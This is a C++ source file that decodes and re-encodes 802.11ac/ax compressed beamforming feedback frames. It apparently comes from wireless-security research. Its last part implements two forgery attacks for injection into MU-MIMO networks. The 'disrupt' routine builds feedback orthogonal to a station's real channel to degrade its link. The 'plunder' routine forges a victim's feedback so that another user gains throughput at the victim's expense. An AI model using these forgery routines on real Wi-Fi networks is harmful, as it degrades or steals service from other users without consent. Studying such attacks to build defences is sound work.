#include "bfi.h"
#include <cmath>
#include <cassert>
#include <stdexcept>
#include <sstream>
#include <algorithm>
#include <random>

// ---------------------------------------------------------------------------
// Internal helpers
// ---------------------------------------------------------------------------

static const float PI = 3.14159265358979f;
static const std::complex<float> J(0.0f, 1.0f);

// Convert raw feedback bytes to a LSB-first bit string
static std::string bytes_to_bitstring(const uint8_t* buf, int len) {
    std::string bits;
    bits.reserve(len * 8);
    for (int i = 0; i < len; i++) {
        for (int b = 0; b < 8; b++)
            bits += ((buf[i] >> b) & 1) ? '1' : '0';
    }
    return bits;
}

// Convert a LSB-first bit string back to bytes
static void bitstring_to_bytes(const std::string& bits, uint8_t* buf, int len) {
    for (int i = 0; i < len; i++) {
        buf[i] = 0;
        for (int b = 0; b < 8; b++) {
            int idx = i * 8 + b;
            if (idx < (int)bits.size() && bits[idx] == '1')
                buf[i] |= (1 << b);
        }
    }
}

// Read Nb bits from bit string at position idx (LSB first), return as unsigned
static uint32_t read_bits(const std::string& bits, int& idx, int nb) {
    uint32_t val = 0;
    for (int b = 0; b < nb; b++) {
        if (idx < (int)bits.size() && bits[idx] == '1')
            val |= (1u << b);
        idx++;
    }
    return val;
}

// Write Nb bits of val into bit string (LSB first)
static void write_bits(std::string& bits, uint32_t val, int nb) {
    for (int b = 0; b < nb; b++)
        bits += ((val >> b) & 1) ? '1' : '0';
}

// ---------------------------------------------------------------------------
// Quantization bit widths per standard and Nc/Nr combination
// 802.11ac Table 8-53d, 802.11ax Table 9-28h
// ---------------------------------------------------------------------------

static void get_quantization_bits(const BFIParams& p, int& nb_phi, int& nb_psi) {
    if (p.standard == BFIStandard::VHT) {
        // 802.11ac: fixed 6/4 bits for all configurations
        nb_phi = 6;
        nb_psi = 4;
    } else {
        // 802.11ax HE: 9/7 for Nr>=2 Nc>=1 (Codebook 1 - high accuracy)
        // Codebook size bit in HE BFI report header determines this.
        // We default to high-accuracy codebook (Codebook=1) which is
        // what the RAX120 uses for MU-MIMO.
        nb_phi = 9;
        nb_psi = 7;
    }
}

// Number of active subcarriers given bandwidth and standard
static int nst_from_bw(int bw_mhz, BFIStandard std) {
    // 802.11ac / 802.11ax subcarrier counts for compressed feedback
    // (data subcarriers only, standard-defined)
    if (std == BFIStandard::VHT) {
        switch (bw_mhz) {
            case 20:  return 52;
            case 40:  return 108;
            case 80:  return 234;
            case 160: return 468;
            default:  return 52;
        }
    } else { // HE
        // HE uses same counts at Ng=1 (no grouping)
        switch (bw_mhz) {
            case 20:  return 52;
            case 40:  return 108;
            case 80:  return 234;
            case 160: return 468;
            default:  return 234;
        }
    }
}


// ---------------------------------------------------------------------------
// Frame detection
// ---------------------------------------------------------------------------

bool bfi_detect(const uint8_t* body, int body_len, BFIParams& out) {
    if (body_len < 4) return false;

    // VHT compressed beamforming: frame body starts with
    // Category=21 (0x15), Action=0, Dialog Token, then VHT MIMO ctrl field
    if (body[0] == 0x15 && body[1] == 0x00) {
        // 3-byte VHT MIMO Control field at body[3..5]
        if (body_len < 6) return false;
        uint32_t ctrl = (uint32_t)body[3]
                      | ((uint32_t)body[4] << 8)
                      | ((uint32_t)body[5] << 16);
        int Nc_idx   = (ctrl >> 0) & 0x7;  // bits 2:0
        int Nr_idx   = (ctrl >> 3) & 0x7;  // bits 5:3
        int bw_idx   = (ctrl >> 6) & 0x3;  // bits 7:6
        // Nc = Nc_idx + 1, Nr = Nr_idx + 1
        out.Nc = Nc_idx + 1;
        out.Nr = Nr_idx + 1;
        int bw_mhz = (bw_idx == 0) ? 20
                   : (bw_idx == 1) ? 40
                   : (bw_idx == 2) ? 80 : 160;
        out.Ng = 1;
        out.standard = BFIStandard::VHT;
        out.Nst = nst_from_bw(bw_mhz, BFIStandard::VHT);
        get_quantization_bits(out, out.Nb_phi, out.Nb_psi);
        // Calculate expected feedback byte length
        int bits_per_sub = 0;
        for (int ii = 1; ii <= std::min(out.Nc, out.Nr - 1); ii++) {
            bits_per_sub += (out.Nr - ii) * out.Nb_phi;  // phi
            bits_per_sub += (out.Nr - ii) * out.Nb_psi;  // psi
        }
        int total_bits = bits_per_sub * out.Nst;
        out.feedback_len = (total_bits + 7) / 8;
        return true;
    }

    // HE compressed beamforming: Category=30 (0x1e), Action=0
    if (body[0] == 0x1e && body[1] == 0x00) {
        // HE MIMO Control field is 5 bytes at body[3..7]
        if (body_len < 8) return false;
        uint64_t ctrl = (uint64_t)body[3]
                      | ((uint64_t)body[4] << 8)
                      | ((uint64_t)body[5] << 16)
                      | ((uint64_t)body[6] << 24)
                      | ((uint64_t)body[7] << 32);
        int Nc_idx  = (ctrl >> 0)  & 0x7;
        int Nr_idx  = (ctrl >> 3)  & 0x7;
        int bw_idx  = (ctrl >> 6)  & 0x3;
        int Ng_idx  = (ctrl >> 11) & 0x3;  // 0=1, 1=2, 2=4, 3=16
        int cb_size = (ctrl >> 13) & 0x1;  // 0=low accuracy, 1=high accuracy
        out.Nc = Nc_idx + 1;
        out.Nr = Nr_idx + 1;
        int bw_mhz = (bw_idx == 0) ? 20
                   : (bw_idx == 1) ? 40
                   : (bw_idx == 2) ? 80 : 160;
        out.Ng = (Ng_idx == 0) ? 1
               : (Ng_idx == 1) ? 2
               : (Ng_idx == 2) ? 4 : 16;
        out.standard = BFIStandard::HE;
        // With grouping, effective subcarrier count is divided by Ng
        out.Nst = nst_from_bw(bw_mhz, BFIStandard::HE) / out.Ng;
        // Codebook: high accuracy uses 9/7, low uses 7/5
        out.Nb_phi = cb_size ? 9 : 7;
        out.Nb_psi = cb_size ? 7 : 5;
        (void)cb_size; // already handled above
        int bits_per_sub = 0;
        for (int ii = 1; ii <= std::min(out.Nc, out.Nr - 1); ii++) {
            bits_per_sub += (out.Nr - ii) * out.Nb_phi;
            bits_per_sub += (out.Nr - ii) * out.Nb_psi;
        }
        int total_bits = bits_per_sub * out.Nst;
        out.feedback_len = (total_bits + 7) / 8;
        return true;
    }

    return false;
}

// ---------------------------------------------------------------------------
// Decompress: bytes -> per-subcarrier V matrices
// ---------------------------------------------------------------------------

FeedbackMatrix bfi_decompress(const uint8_t* feedback_bytes,
                               const BFIParams& p) {
    std::string bits = bytes_to_bitstring(feedback_bytes, p.feedback_len);

    int Nst_eff = p.Nst;
    int Na = 0; // angles per subcarrier
    for (int ii = 1; ii <= std::min(p.Nc, p.Nr - 1); ii++)
        Na += (p.Nr - ii) * 2; // phi + psi counts

    // angles[angle_idx][subcarrier] stored as raw quantized floats
    // We interleave angle groups per subcarrier following the standard order
    std::vector<std::vector<float>> angles(Na, std::vector<float>(Nst_eff, 0.f));

    double pow_phi = std::pow(2.0, p.Nb_phi);
    double pow_psi = std::pow(2.0, p.Nb_psi + 2);

    int bit_idx = 0;
    for (int kk = 0; kk < Nst_eff; kk++) {
        int acnt = 0;
        for (int ii = p.Nr - 1; ii >= std::max(p.Nr - p.Nc, 1); ii--) {
            // phi angles
            for (int jj = 0; jj < ii; jj++) {
                uint32_t raw = read_bits(bits, bit_idx, p.Nb_phi);
                angles[acnt][kk] = (2.f * raw + 1.f) / (float)pow_phi;
                acnt++;
            }
            // psi angles
            for (int jj = 0; jj < ii; jj++) {
                uint32_t raw = read_bits(bits, bit_idx, p.Nb_psi);
                angles[acnt][kk] = (2.f * raw + 1.f) / (float)pow_psi;
                acnt++;
            }
        }
    }

    // Reconstruct V matrices using Givens rotations (same as upstream)
    using CMat = Eigen::Matrix<std::complex<float>, Eigen::Dynamic, Eigen::Dynamic>;

    FeedbackMatrix V(Nst_eff);
    for (int kk = 0; kk < Nst_eff; kk++) {
        V[kk] = CMat::Identity(p.Nr, p.Nc);
    }

    int p_min = std::min(p.Nc, p.Nr - 1);
    int angle_cnt = Na; // count down from total

    Eigen::MatrixXf Gt = Eigen::MatrixXf::Identity(p.Nr, p.Nr);

    for (int ii = p_min; ii >= 1; ii--) {
        // Apply rotation matrices
        for (int jj = p.Nr; jj >= ii + 1; jj--) {
            for (int kk = 0; kk < Nst_eff; kk++) {
                float theta = angles[angle_cnt - 1][kk] * PI;
                Gt.setIdentity(p.Nr, p.Nr);
                Gt(ii-1, ii-1) =  std::cos(theta);
                Gt(ii-1, jj-1) = -std::sin(theta);
                Gt(jj-1, ii-1) =  std::sin(theta);
                Gt(jj-1, jj-1) =  std::cos(theta);
                V[kk] = Gt.cast<std::complex<float>>() * V[kk];
            }
            angle_cnt--;
        }
        // Apply phase shifts
        for (int kk = 0; kk < Nst_eff; kk++) {
            for (int row = 0; row < p.Nr; row++) {
                int ai = angle_cnt - p.Nr + ii + row;
                if (ai >= 0 && ai < Na) {
                    std::complex<float> phase =
                        std::exp(J * PI * angles[ai][kk]);
                    V[kk].row(row) *= phase;
                }
            }
        }
        angle_cnt -= (p.Nr - ii);
    }

    return V;
}

// ---------------------------------------------------------------------------
// Compress: per-subcarrier V matrices -> bytes
// ---------------------------------------------------------------------------

void bfi_compress(const FeedbackMatrix& matrices,
                  const BFIParams& p,
                  uint8_t* out_bytes) {
    using CMat = Eigen::Matrix<std::complex<float>, Eigen::Dynamic, Eigen::Dynamic>;

    int Nst_eff = p.Nst;
    double pow_phi = std::pow(2.0, p.Nb_phi);
    double pow_psi = std::pow(2.0, p.Nb_psi + 2);

    // Work on copies we can modify during angle extraction
    std::vector<CMat> W = matrices;

    int Na = 0;
    for (int ii = 1; ii <= std::min(p.Nc, p.Nr - 1); ii++)
        Na += (p.Nr - ii) * 2;

    std::vector<std::vector<float>> angles_W(Na, std::vector<float>(Nst_eff, 0.f));

    Eigen::MatrixXf Gt = Eigen::MatrixXf::Identity(p.Nr, p.Nr);
    int acnt = 0;
    int p_min = std::min(p.Nc, p.Nr - 1);

    for (int ii = 1; ii <= p_min; ii++) {
        // Extract phi angles
        for (int kk = 0; kk < Nst_eff; kk++) {
            for (int jj = 0; jj < p.Nr - ii; jj++) {
                float phi = std::arg(W[kk](ii - 1 + jj, ii - 1));
                if (phi < 0.f) phi += PI * 2.f;
                angles_W[acnt + jj][kk] = phi;
            }
            for (int jj = 0; jj < p.Nr - ii; jj++) {
                W[kk].row(ii - 1 + jj) *=
                    std::exp(-J * angles_W[acnt + jj][kk]);
            }
        }
        acnt += p.Nr - ii;

        // Extract psi angles via Givens
        for (int ll = ii + 1; ll <= p.Nr; ll++) {
            for (int kk = 0; kk < Nst_eff; kk++) {
                float psi = std::atan2(W[kk](ll - 1, ii - 1).real(),
                                       W[kk](ii - 1, ii - 1).real());
                angles_W[acnt][kk] = psi;
                Gt.setIdentity(p.Nr, p.Nr);
                Gt(ii-1, ii-1) =  std::cos(psi);
                Gt(ii-1, ll-1) =  std::sin(psi);
                Gt(ll-1, ii-1) = -std::sin(psi);
                Gt(ll-1, ll-1) =  std::cos(psi);
                W[kk] = Gt.cast<std::complex<float>>() * W[kk];
            }
            acnt++;
        }
    }

    // Encode angles to bits
    std::string bits;
    bits.reserve(p.feedback_len * 8);

    for (int kk = 0; kk < Nst_eff; kk++) {
        int ac = 0;
        for (int ii = p.Nr - 1; ii >= std::max(p.Nr - p.Nc, 1); ii--) {
            // phi
            for (int jj = 1; jj <= ii; jj++) {
                int32_t q = (int32_t)std::round(
                    0.5f * (angles_W[ac][kk] * (float)pow_phi / PI - 1.f));
                q = std::max(0, std::min(q, (int)(pow_phi) - 1));
                write_bits(bits, (uint32_t)q, p.Nb_phi);
                ac++;
            }
            // psi
            for (int jj = 1; jj <= ii; jj++) {
                int32_t q = (int32_t)std::round(
                    0.5f * (angles_W[ac][kk] * (float)pow_psi / PI - 1.f));
                q = std::max(0, std::min(q, (int)(pow_psi / 4) - 1));
                write_bits(bits, (uint32_t)q, p.Nb_psi);
                ac++;
            }
        }
    }

    // Pad to full byte length
    while ((int)bits.size() < p.feedback_len * 8)
        bits += '0';

    bitstring_to_bytes(bits, out_bytes, p.feedback_len);
}

// ---------------------------------------------------------------------------
// Forgery: disruption (orthogonal to genuine V)
// ---------------------------------------------------------------------------

FeedbackMatrix bfi_forge_disrupt(const FeedbackMatrix& genuine,
                                  const BFIParams& p) {
    using CMat = Eigen::Matrix<std::complex<float>, Eigen::Dynamic, Eigen::Dynamic>;

    int Nst_eff = p.Nst;

    using CVec = Eigen::Matrix<std::complex<float>, Eigen::Dynamic, 1>;

    // Fixed random seed for reproducibility across injections
    std::mt19937 rng(42);
    std::uniform_real_distribution<float> dist(-1.f, 1.f);

    // Generate a single random matrix R used as the basis for all subcarriers
    CMat R(p.Nr, p.Nc);
    for (int r = 0; r < p.Nr; r++)
        for (int c = 0; c < p.Nc; c++)
            R(r, c) = std::complex<float>(dist(rng), dist(rng));

    FeedbackMatrix W(Nst_eff);

    for (int kk = 0; kk < Nst_eff; kk++) {
        CMat Wk(p.Nr, p.Nc);

        for (int col = 0; col < p.Nc; col++) {
            CVec w = R.col(col);

            // Subtract projections onto all genuine V columns
            for (int vc = 0; vc < p.Nc; vc++) {
                std::complex<float> proj =
                    genuine[kk].col(vc).adjoint() * w;
                w -= proj * genuine[kk].col(vc);
            }

            // Subtract projections onto already-computed W columns
            for (int wc = 0; wc < col; wc++) {
                std::complex<float> proj =
                    Wk.col(wc).adjoint() * w;
                w -= proj * Wk.col(wc);
            }

            // Normalize using last element to maintain phase convention
            // consistent with 802.11 standard requirement
            if (std::abs(w(p.Nr - 1)) > 1e-8f)
                w /= w(p.Nr - 1);
            float n = w.norm();
            if (n > 1e-8f) w /= n;

            Wk.col(col) = w;
        }

        W[kk] = Wk;
    }

    return W;
}

// ---------------------------------------------------------------------------
// Forgery: plunder (victim forged orthogonal to beneficiary)
// ---------------------------------------------------------------------------

FeedbackMatrix bfi_forge_plunder(const FeedbackMatrix& /*victim_genuine*/,
                                  const FeedbackMatrix& beneficiary_genuine,
                                  const BFIParams& p) {
    using CMat = Eigen::Matrix<std::complex<float>, Eigen::Dynamic, Eigen::Dynamic>;

    int Nst_eff = p.Nst;
    FeedbackMatrix W(Nst_eff);

    using CVec = Eigen::Matrix<std::complex<float>, Eigen::Dynamic, 1>;

    // For plunder: forge victim's V to be orthogonal to beneficiary's V.
    // This eliminates inter-user interference at the beneficiary regardless
    // of which beamforming algorithm (direct or ZF) the AP uses.
    // Method: project victim's genuine V onto the subspace orthogonal
    // to beneficiary's genuine V, then re-orthonormalize.

    std::mt19937 rng(42);
    std::uniform_real_distribution<float> dist(-1.f, 1.f);

    CMat R(p.Nr, p.Nc);
    for (int r = 0; r < p.Nr; r++)
        for (int c = 0; c < p.Nc; c++)
            R(r, c) = std::complex<float>(dist(rng), dist(rng));

    for (int kk = 0; kk < Nst_eff; kk++) {
        CMat Wk(p.Nr, p.Nc);

        for (int col = 0; col < p.Nc; col++) {
            CVec w = R.col(col);

            // Subtract projections onto beneficiary's columns
            for (int bc = 0; bc < p.Nc; bc++) {
                std::complex<float> proj =
                    beneficiary_genuine[kk].col(bc).adjoint() * w;
                w -= proj * beneficiary_genuine[kk].col(bc);
            }

            // Subtract already-computed W columns
            for (int wc = 0; wc < col; wc++) {
                std::complex<float> proj =
                    Wk.col(wc).adjoint() * w;
                w -= proj * Wk.col(wc);
            }

            if (std::abs(w(p.Nr - 1)) > 1e-8f)
                w /= w(p.Nr - 1);
            float n = w.norm();
            if (n > 1e-8f) w /= n;

            Wk.col(col) = w;
        }

        W[kk] = Wk;
    }

    return W;
}

// ---------------------------------------------------------------------------
// Human-readable parameter string
// ---------------------------------------------------------------------------

std::string params_standard_str(const BFIParams& p) {
    return (p.standard == BFIStandard::VHT) ? "VHT"
         : (p.standard == BFIStandard::HE)  ? "HE"
         : "UNKNOWN";
}

std::string bfi_params_str(const BFIParams& p) {
    std::ostringstream ss;
    ss << "Standard=" << (p.standard == BFIStandard::VHT ? "VHT/802.11ac" :
                          p.standard == BFIStandard::HE  ? "HE/802.11ax"  :
                          "UNKNOWN")
       << " Nr=" << p.Nr
       << " Nc=" << p.Nc
       << " Nst=" << p.Nst
       << " Ng=" << p.Ng
       << " Nb_phi=" << p.Nb_phi
       << " Nb_psi=" << p.Nb_psi
       << " feedback_len=" << p.feedback_len << "B";
    return ss.str();
}
